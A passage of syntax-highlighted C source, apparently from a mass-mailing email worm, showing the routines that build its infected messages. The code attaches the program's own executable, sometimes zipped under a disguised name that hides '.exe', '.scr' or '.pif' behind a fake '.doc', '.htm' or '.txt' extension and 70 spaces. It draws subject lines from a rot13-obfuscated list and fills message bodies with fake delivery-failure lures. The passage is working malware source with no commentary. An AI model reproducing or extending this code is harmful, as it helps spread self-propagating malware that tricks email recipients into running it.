            </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">subject</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'a'</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">26</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">subject</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tot</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">subjs</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc11">tot</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">subjs</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc11">tot</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tot</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">subjs</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">tot</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">subjs</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">subjs</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">rot13</span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">subject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">subjs</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">subj</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">100</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">50</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">85</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc11">CharUpperBuff</span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">subject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">85</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">CharUpper</span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">subject</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">select_attach_file</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">msgstate_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">state</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">h</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">zip_used</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">zip_nametrick</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">100</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">64</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">zip_used</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">zip_used</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">is_tempfile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">attach_file</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">is_tempfile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">GetTempPath</span><span class="sc10">(</span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">attach_file</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">GetTempFileName</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tmp"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">attach_file</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">attach_file</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">zip_nametrick</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">100</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">40</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">zip_nametrick</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">zip_nametrick</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">zip_store</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">attach_file</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">attach_name</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">zip_name</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">zip_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">exe_name</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">zip_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"."</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">switch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">zip_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"doc"</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">zip_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"htm"</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">default</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">zip_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"txt"</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">70</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">zip_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">zip_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"."</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">switch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">zip_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"e"</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">zip_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"xe"</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">zip_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"s"</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">zip_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cr"</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">default</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">zip_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"p"</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">zip_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"if"</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">zip_store</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">attach_file</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">zip_name</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">attach_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%s.zip"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">exe_name</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">h</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">attach_file</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">|</span><span class="sc11">FILE_SHARE_WRITE</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">h</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">h</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">is_tempfile</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">attach_file</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">attach_size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetFileSize</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">attach_size</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">1024</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">attach_size</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">300</span><span class="sc10">*</span><span class="sc4">1024</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">is_tempfile</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">attach_file</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">write_msgtext</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">msgstate_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">state</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">pref</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">text</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">texts</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"test"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">40</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"The message cannot be represented in 7-bit ASCII encoding and has been sent as a binary attachment."</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">40</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"The message contains Unicode characters and has been sent as a binary attachment."</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Mail transaction failed. Partial message is available."</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">w</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">100</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">w</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">512</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">2048</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">w</span><span class="sc10">;)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">c</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xFF</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">c</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">c</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'='</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'+'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">127</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">128</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">p</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">70</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">p</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">13</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">p</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">p</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

